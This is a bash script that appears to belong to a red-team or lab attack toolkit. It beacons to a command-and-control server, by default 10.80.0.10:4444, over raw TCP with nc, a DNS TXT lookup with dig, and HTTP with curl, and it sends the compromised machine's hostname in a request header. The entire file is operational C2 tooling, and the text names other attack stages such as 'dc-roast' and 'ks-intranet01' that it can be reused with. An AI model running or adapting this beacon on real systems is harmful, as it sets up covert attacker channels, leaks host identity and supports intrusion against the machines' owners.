#!/usr/bin/env bash
# c2-beacon-10-80-0-10.sh
# Category: c2 | Node: vault-keystone | Reusable: dc-roast, ks-intranet01
set -euo pipefail

C2_HOST="${C2_HOST:-10.80.0.10}"
C2_PORT="${C2_PORT:-4444}"
CHANNELS="${CHANNELS:-tcp,http}"

if [[ -z "$C2_HOST" ]]; then echo "ERROR: C2_HOST required" >&2; exit 1; fi

echo "[c2] Starting $CHANNELS beacon to $C2_HOST:$C2_PORT"

for ch in $(echo "$CHANNELS" | tr ',' ' '); do
    case "$ch" in
        tcp)
            (timeout 5 bash -c 'echo "beacon tcp" | nc $C2_HOST $C2_PORT' || true) &
            ;;
        dns)
            (dig +short TXT "beacon.$C2_HOST" @8.8.8.8 || true) &
            ;;
        http)
            (curl -s "http://$C2_HOST:$C2_PORT/beacon" -H "X-Node: $(hostname)" || true) &
            ;;
    esac
done

wait
echo "[c2] Beacon cycle complete"
